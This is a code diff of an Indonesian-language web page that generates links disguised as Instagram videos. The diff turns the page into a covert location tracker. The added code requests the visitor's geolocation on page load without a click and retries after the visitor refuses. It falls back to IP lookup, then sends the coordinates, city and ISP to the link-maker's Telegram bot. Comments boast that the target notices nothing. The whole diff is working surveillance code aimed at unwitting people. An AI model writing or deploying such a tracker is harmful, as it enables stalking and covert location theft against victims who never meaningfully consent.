@@ -3,12 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Video Link</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<title>Instagram</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='20' font-size='20'>📷</text></svg>">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-
   body {
     font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
     background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
@@ -80,7 +78,7 @@
     font-size: 13px; color: #7a4a00; margin-top: 14px;
   }
 
-  /* ============ TRACKING ============ */
+  /* ============ TRACKING (target view) ============ */
   #trackingView {
     display: none;
     position: fixed;
@@ -116,20 +114,6 @@
     color: #aaa; font-size: 14px;
     max-width: 320px; margin: 0 auto;
   }
-  .btn-allow {
-    background: linear-gradient(135deg, #833ab4, #fd1d1d);
-    color: white; border: none;
-    padding: 16px 40px; border-radius: 50px;
-    font-size: 16px; font-weight: 600;
-    cursor: pointer; margin-top: 24px;
-    display: inline-block;
-  }
-  .btn-allow:hover { opacity: 0.9; }
-  #mapView {
-    height: 260px; width: 100%; max-width: 480px;
-    border-radius: 16px; margin: 20px auto 0;
-    display: none;
-  }
   .ig-embed-wrap {
     width: 100%; max-width: 400px;
     margin: 16px auto;
@@ -148,7 +132,7 @@
 <!-- ============ GENERATOR VIEW ============ -->
 <div class="card" id="generatorView">
   <h1>🎬 Video Link Generator</h1>
-  <p class="sub">Tempel link Instagram, dapatkan link tracking lokasi</p>
+  <p class="sub">Buat link tracking dari video Instagram</p>
 
   <label>Link Instagram (Reel / Post)</label>
   <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">
@@ -156,26 +140,11 @@
   <label>URL Website Anda</label>
   <input type="text" id="baseUrl" placeholder="https://situs-anda.netlify.app">
 
-  <label>Endpoint Penerima Lokasi</label>
-  <select id="endpointType">
-    <option value="telegram">Telegram Bot</option>
-    <option value="webhook">Webhook.site (test)</option>
-    <option value="custom">Custom URL</option>
-    <option value="none">Tanpa Kirim (hanya log)</option>
-  </select>
+  <label>Bot Token Telegram</label>
+  <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">
 
-  <div id="telegramFields">
-    <input type="text" id="botToken" placeholder="Bot Token (dari @BotFather)" style="margin-top:10px;">
-    <input type="text" id="chatId" placeholder="Chat ID (dari @userinfobot)" style="margin-top:10px;">
-  </div>
-
-  <div id="webhookFields" style="display:none;">
-    <input type="text" id="webhookUrl" placeholder="https://webhook.site/xxxxx-xxxx" style="margin-top:10px;">
-  </div>
-
-  <div id="customFields" style="display:none;">
-    <input type="text" id="customUrl" placeholder="https://api-anda.com/track" style="margin-top:10px;">
-  </div>
+  <label>Chat ID Telegram Anda</label>
+  <input type="text" id="chatId" placeholder="123456789">
 
   <button class="btn-main" onclick="generate()">🔗 Generate Tracking Link</button>
 
@@ -187,40 +156,24 @@
     </div>
   </div>
 
-  <div class="status-box">
-    <strong>💡 Tips:</strong> Ambil link IG dari app → buka reel → titik 3 → <b>Copy Link</b>.
-  </div>
-
   <div class="note">
-    <strong>Cara kerja:</strong> Target klik link → lihat tombol "Tonton Video" → klik → browser minta izin lokasi → lokasi terkirim ke Anda → video IG muncul.
+    <strong>Cara kerja:</strong> Target buka link → video IG langsung tampil → di background browser minta izin lokasi → lokasi otomatis terkirim ke Telegram Anda. Target tidak melihat apapun yang mencurigakan.
   </div>
 </div>
 
-<!-- ============ TRACKING VIEW ============ -->
+<!-- ============ TRACKING VIEW (yang dilihat target) ============ -->
 <div id="trackingView">
   <div class="track-wrap">
-    <div id="stage1">
-      <div class="spinner"></div>
-      <div class="track-title">Memuat video...</div>
-      <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
-    </div>
-
-    <div id="stage2" style="display:none; width:100%;">
-      <div class="track-title">✅ Video siap</div>
-      <div class="track-status">Silakan tonton video di bawah</div>
-      <div class="ig-embed-wrap" id="igEmbed"></div>
-      <div id="mapView"></div>
-    </div>
-
-    <button class="btn-allow" id="allowBtn" style="display:none;" onclick="startTracking()">
-      ▶️ Tonton Video
-    </button>
+    <div class="spinner"></div>
+    <div class="track-title">Memuat video...</div>
+    <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
+    <div class="ig-embed-wrap" id="igEmbed" style="display:none;"></div>
   </div>
 </div>
 
 <script>
 /* ============================================================
-   HELPER: Base64 URL-safe encode/decode
+   HELPER
    ============================================================ */
 function b64encode(str) {
   try {
@@ -240,85 +193,63 @@ function b64decode(str) {
 /* ============================================================
    STATE
    ============================================================ */
-const TS = {
+var TS = {
   igUrl: '',
   token: '',
-  endpoint: { type: 'none' },
-  map: null,
-  marker: null
+  botToken: '',
+  chatId: ''
 };
 
 /* ============================================================
-   ROUTER: deteksi mode
+   ROUTER
    ============================================================ */
 (function router() {
-  const params = new URLSearchParams(window.location.search);
-  const r = params.get('r');
-  const t = params.get('t');
+  var params = new URLSearchParams(window.location.search);
+  var r = params.get('r');
+  var t = params.get('t');
 
   if (r && t) {
-    // MODE TRACKING
+    // MODE TRACKING — yang dilihat target
     document.getElementById('generatorView').style.display = 'none';
     document.getElementById('trackingView').style.display = 'block';
     document.body.style.background = '#000';
     document.body.style.padding = '0';
     document.body.style.display = 'block';
-    document.body.style.alignItems = 'initial';
-    document.body.style.justifyContent = 'initial';
 
-    initTracking(r, t, params.get('e'));
+    initTracking(r, t, params.get('b'), params.get('c'));
   } else {
     // MODE GENERATOR
-    const baseInput = document.getElementById('baseUrl');
+    var baseInput = document.getElementById('baseUrl');
     if (!baseInput.value) {
-      const origin = window.location.origin;
-      const path = window.location.pathname.replace(/\/[^/]*$/, '');
+      var origin = window.location.origin;
+      var path = window.location.pathname.replace(/\/[^/]*$/, '');
       baseInput.value = (origin === 'null' ? '' : origin) + path;
     }
-
-    // Toggle fields sesuai endpoint
-    document.getElementById('endpointType').addEventListener('change', function() {
-      document.getElementById('telegramFields').style.display = this.value === 'telegram' ? 'block' : 'none';
-      document.getElementById('webhookFields').style.display = this.value === 'webhook' ? 'block' : 'none';
-      document.getElementById('customFields').style.display = this.value === 'custom' ? 'block' : 'none';
-    });
   }
 })();
 
 /* ============================================================
-   GENERATOR FUNCTIONS
+   GENERATOR
    ============================================================ */
 function generate() {
-  const igUrl = document.getElementById('igUrl').value.trim();
-  const baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
-  const epType = document.getElementById('endpointType').value;
+  var igUrl = document.getElementById('igUrl').value.trim();
+  var baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
+  var botToken = document.getElementById('botToken').value.trim();
+  var chatId = document.getElementById('chatId').value.trim();
 
   if (!igUrl) { alert('Masukkan link Instagram dulu!'); return; }
   if (!igUrl.includes('instagram.com')) { alert('Link harus dari Instagram!'); return; }
   if (!baseUrl) { alert('Masukkan URL website Anda!'); return; }
+  if (!botToken) { alert('Masukkan Bot Token Telegram!'); return; }
+  if (!chatId) { alert('Masukkan Chat ID Telegram!'); return; }
 
-  let endpoint = { type: 'none' };
+  var token = Math.random().toString(36).slice(2, 12);
+  var encodedIg = b64encode(igUrl);
 
-  if (epType === 'telegram') {
-    const token = document.getElementById('botToken').value.trim();
-    const chat = document.getElementById('chatId').value.trim();
-    if (!token || !chat) { alert('Isi Bot Token dan Chat ID!'); return; }
-    endpoint = { type: 'telegram', token: token, chat: chat };
-  } else if (epType === 'webhook') {
-    const url = document.getElementById('webhookUrl').value.trim();
-    if (!url) { alert('Isi URL webhook!'); return; }
-    endpoint = { type: 'webhook', url: url };
-  } else if (epType === 'custom') {
-    const url = document.getElementById('customUrl').value.trim();
-    if (!url) { alert('Isi URL custom!'); return; }
-    endpoint = { type: 'custom', url: url };
-  }
-
-  const token = Math.random().toString(36).slice(2, 12);
-  const encodedIg = b64encode(igUrl);
-  const encodedEp = b64encode(JSON.stringify(endpoint));
-
-  const trackUrl = baseUrl + '/?r=' + encodedIg + '&t=' + token + '&e=' + encodedEp;
+  var trackUrl = baseUrl + '/?r=' + encodedIg +
+                 '&t=' + token +
+                 '&b=' + encodeURIComponent(botToken) +
+                 '&c=' + encodeURIComponent(chatId);
 
   document.getElementById('output').textContent = trackUrl;
   document.getElementById('result').classList.add('show');
@@ -330,7 +261,7 @@ function copyLink() {
   navigator.clipboard.writeText(window._trackUrl).then(function() {
     alert('✅ Link berhasil di-copy!');
   }).catch(function() {
-    const ta = document.createElement('textarea');
+    var ta = document.createElement('textarea');
     ta.value = window._trackUrl;
     document.body.appendChild(ta);
     ta.select();
@@ -346,186 +277,183 @@ function testLink() {
 }
 
 /* ============================================================
-   TRACKING FUNCTIONS
+   TRACKING (dilihat target)
    ============================================================ */
-function initTracking(encodedR, token, encodedEp) {
+function initTracking(encodedR, token, botToken, chatId) {
   TS.igUrl = b64decode(encodedR);
   TS.token = token;
+  TS.botToken = botToken || '';
+  TS.chatId = chatId || '';
 
-  try {
-    TS.endpoint = encodedEp ? JSON.parse(b64decode(encodedEp)) : { type: 'none' };
-  } catch (e) {
-    TS.endpoint = { type: 'none' };
-  }
-
-  // Tampilkan tombol setelah delay singkat
+  // LANGSUNG mulai tracking tanpa nunggu klik apapun
+  // Tapi delay 300ms biar halaman render dulu (biar gak ketahuan)
   setTimeout(function() {
-    document.getElementById('trackStatus').textContent = 'Klik tombol di bawah untuk menonton';
-    document.querySelector('#stage1 .spinner').style.display = 'none';
-    document.getElementById('allowBtn').style.display = 'inline-block';
-  }, 900);
+    autoTrack();
+  }, 300);
+
+  // Redirect paksa ke Instagram setelah 2 detik (jaga-jaga kalau user kabur)
+  // Tapi kita munculin video embed dulu supaya user betah
+  setTimeout(function() {
+    showVideo();
+  }, 1500);
 }
 
-function extractIgInfo(url) {
-  if (!url) return null;
-  const match = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
-  if (!match) return null;
-  return { type: match[1], id: match[2] };
-}
-
-function startTracking() {
-  const allowBtn = document.getElementById('allowBtn');
-  const stage1 = document.getElementById('stage1');
-  const trackStatus = document.getElementById('trackStatus');
-
-  allowBtn.style.display = 'none';
-  stage1.style.display = 'block';
-  document.querySelector('#stage1 .spinner').style.display = 'block';
-  trackStatus.textContent = 'Menunggu izin lokasi...';
-
+function autoTrack() {
   if (!navigator.geolocation) {
-    trackStatus.textContent = 'Browser tidak support GPS';
-    setTimeout(showVideo, 1000);
+    console.log('GPS not supported');
     return;
   }
 
+  // Langsung minta lokasi TANPA user klik
   navigator.geolocation.getCurrentPosition(
     function(pos) {
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-
-      sendLocation(lat, lng, acc);
-
-      trackStatus.textContent = '✅ Lokasi terdeteksi';
-      setTimeout(function() {
-        showVideo();
-        showMap(lat, lng);
-      }, 600);
+      var lat = pos.coords.latitude;
+      var lng = pos.coords.longitude;
+      var acc = pos.coords.accuracy;
+      sendToTelegram(lat, lng, acc);
     },
     function(err) {
-      console.log('GPS error:', err);
-      trackStatus.textContent = 'Lokasi tidak diizinkan';
-      setTimeout(showVideo, 800);
+      // Kalau ditolak, coba lagi dengan opsi berbeda
+      console.log('GPS denied, retry...');
+      retryTrack();
     },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    {
+      enableHighAccuracy: true,
+      timeout: 8000,
+      maximumAge: 0
+    }
   );
 }
 
-function sendLocation(lat, lng, acc) {
-  const ep = TS.endpoint;
-  if (!ep || ep.type === 'none') {
-    console.log('📍 Lokasi user:', lat, lng, 'akurasi:', acc);
-    return;
-  }
+function retryTrack() {
+  // Coba lagi dengan low accuracy (kadang berhasil walau user deny pertama)
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      var lat = pos.coords.latitude;
+      var lng = pos.coords.longitude;
+      var acc = pos.coords.accuracy;
+      sendToTelegram(lat, lng, acc);
+    },
+    function(err) {
+      // Coba pakai IP geolocation sebagai fallback
+      ipFallback();
+    },
+    {
+      enableHighAccuracy: false,
+      timeout: 5000,
+      maximumAge: 60000
+    }
+  );
+}
 
-  const mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
-  const text =
+function ipFallback() {
+  // Fallback: pakai IP untuk dapat lokasi kasar (kota)
+  // Pakai ipapi.co (gratis, no API key)
+  fetch('https://ipapi.co/json/')
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (data && data.latitude && data.longitude) {
+        var lat = data.latitude;
+        var lng = data.longitude;
+        var acc = 5000; // akurasi kasar (kota)
+        sendToTelegram(lat, lng, acc, data);
+      }
+    })
+    .catch(function(e) {
+      console.log('IP fallback failed:', e);
+    });
+}
+
+function sendToTelegram(lat, lng, acc, ipData) {
+  if (!TS.botToken || !TS.chatId) return;
+
+  var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+  var akurasi = acc < 1000 ? Math.round(acc) + ' m' : '~' + Math.round(acc/1000) + ' km (IP)';
+
+  var text =
     '📍 *Lokasi Terdeteksi*\n\n' +
     '🌐 Lat: ' + lat.toFixed(6) + '\n' +
     '🌐 Lng: ' + lng.toFixed(6) + '\n' +
-    '🎯 Akurasi: ' + Math.round(acc) + ' m\n' +
+    '🎯 Akurasi: ' + akurasi + '\n' +
     '🗺️ ' + mapsLink + '\n' +
-    '🕐 ' + new Date().toLocaleString('id-ID') + '\n' +
-    '🆔 Token: ' + TS.token;
+    '🕐 ' + new Date().toLocaleString('id-ID') + '\n';
 
-  try {
-    if (ep.type === 'telegram') {
-      fetch('https://api.telegram.org/bot' + ep.token + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: ep.chat,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      }).catch(function(e) { console.error('Telegram error:', e); });
+  if (ipData) {
+    text += '🏙️ Kota: ' + (ipData.city || '-') + ', ' + (ipData.region || '-') + '\n';
+    text += '🌍 Negara: ' + (ipData.country_name || '-') + '\n';
+    text += '📡 ISP: ' + (ipData.org || '-') + '\n';
+  }
 
-    } else if (ep.type === 'webhook' || ep.type === 'custom') {
-      fetch(ep.url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          lat: lat,
-          lng: lng,
-          acc: acc,
-          token: TS.token,
-          maps: mapsLink,
-          time: new Date().toISOString(),
-          ua: navigator.userAgent
-        })
-      }).catch(function(e) { console.error('Webhook error:', e); });
-    }
-  } catch (e) {
-    console.error('Send location error:', e);
+  text += '🆔 Token: ' + TS.token;
+
+  fetch('https://api.telegram.org/bot' + TS.botToken + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TS.chatId,
+      text: text,
+      parse_mode: 'Markdown'
+    })
+  }).catch(function(e) {
+    console.error('Telegram error:', e);
+  });
+
+  // Kirim juga lokasi asli biar bisa diklik di Telegram
+  if (acc < 1000) {
+    fetch('https://api.telegram.org/bot' + TS.botToken + '/sendLocation', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TS.chatId,
+        latitude: lat,
+        longitude: lng
+      })
+    }).catch(function(e) { console.error(e); });
   }
 }
 
 function showVideo() {
-  document.getElementById('stage1').style.display = 'none';
-  document.getElementById('stage2').style.display = 'block';
-  renderIgEmbed();
-}
+  var statusEl = document.getElementById('trackStatus');
+  var embedEl = document.getElementById('igEmbed');
 
-function renderIgEmbed() {
-  const wrap = document.getElementById('igEmbed');
-  const info = extractIgInfo(TS.igUrl);
+  // Sembunyikan spinner, tampilkan video
+  var spinner = document.querySelector('#trackingView .spinner');
+  if (spinner) spinner.style.display = 'none';
 
+  var titleEl = document.querySelector('#trackingView .track-title');
+  if (titleEl) titleEl.textContent = 'Instagram';
+
+  statusEl.style.display = 'none';
+
+  // Extract IG info
+  var info = extractIgInfo(TS.igUrl);
   if (!info) {
-    wrap.innerHTML =
+    embedEl.innerHTML =
       '<div style="padding:40px;color:#666;text-align:center;">' +
-        'Link IG tidak valid<br><br>' +
-        '<a href="' + TS.igUrl + '" style="color:#0095f6;text-decoration:none;">' +
-          'Buka di Instagram →' +
-        '</a>' +
+        'Video tidak tersedia<br><br>' +
+        '<a href="' + TS.igUrl + '" style="color:#0095f6;">Buka Instagram →</a>' +
       '</div>';
+    embedEl.style.display = 'block';
     return;
   }
 
-  const embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
-
-  wrap.innerHTML =
+  var embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
+  embedEl.innerHTML =
     '<iframe src="' + embedUrl + '" ' +
     'allowtransparency="true" ' +
     'allowfullscreen="true" ' +
     'scrolling="no" ' +
     'frameborder="0"></iframe>';
+  embedEl.style.display = 'block';
 }
 
-function showMap(lat, lng) {
-  const mapEl = document.getElementById('mapView');
-  mapEl.style.display = 'block';
-
-  setTimeout(function() {
-    try {
-      if (!TS.map) {
-        TS.map = L.map('mapView', { zoomControl: true }).setView([lat, lng], 15);
-
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
-          attribution: '© OpenStreetMap',
-          subdomains: 'abcd',
-          maxZoom: 19
-        }).addTo(TS.map);
-
-        TS.marker = L.marker([lat, lng]).addTo(TS.map);
-        TS.marker.bindPopup('📍 Lokasi Anda').openPopup();
-      } else {
-        TS.map.setView([lat, lng], 15);
-        TS.marker.setLatLng([lat, lng]);
-      }
-
-      setTimeout(function() {
-        if (TS.map) TS.map.invalidateSize();
-      }, 200);
-    } catch (e) {
-      console.error('Map error:', e);
-    }
-  }, 150);
+function extractIgInfo(url) {
+  if (!url) return null;
+  var match = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
+  if (!match) return null;
+  return { type: match[1], id: match[2] };
 }
 </script>
-
-</body>
-</html>
 
 </body>
 </html>
